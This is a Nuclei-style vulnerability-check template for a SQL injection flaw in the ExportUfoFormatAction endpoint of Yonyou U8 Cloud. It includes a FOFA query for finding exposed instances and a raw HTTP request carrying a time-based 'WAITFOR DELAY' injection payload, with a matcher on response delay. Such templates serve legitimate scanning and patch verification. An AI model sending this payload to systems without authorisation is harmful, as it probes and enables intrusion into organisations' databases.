id: U8-cloud-ExportUfoFormatAction-sqli

info:
  name: U8cloud系统ExportUfoFormatAction接口存在SQL注入漏洞
  author: k3ppf0r
  severity: high
  description: |  
    攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
  reference:
    - https://security.yonyou.com/#/noticeInfo?id=519
    - https://github.com/wy876/POC/commit/a60fe5bafa49a5df1badb7e5100be1fa5d2575ed
  remediation: |
    升级补丁<U8CLOUD系统ExportUfoFormatAction接口存在SQL注入漏洞的安全补丁>
  classification:
    cve-id: TVE-2024-105091150
    cvss-score: 7.8
    cwe-id: CWE-89
  metadata:
    date: 2024-03-08
    version: | 
      用友U8 cloud 1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp
    fofa-query: app="用友-U8-Cloud"
  tags: yonyou,sqli,ncc,u8
  
http:
  - raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && duration>=5"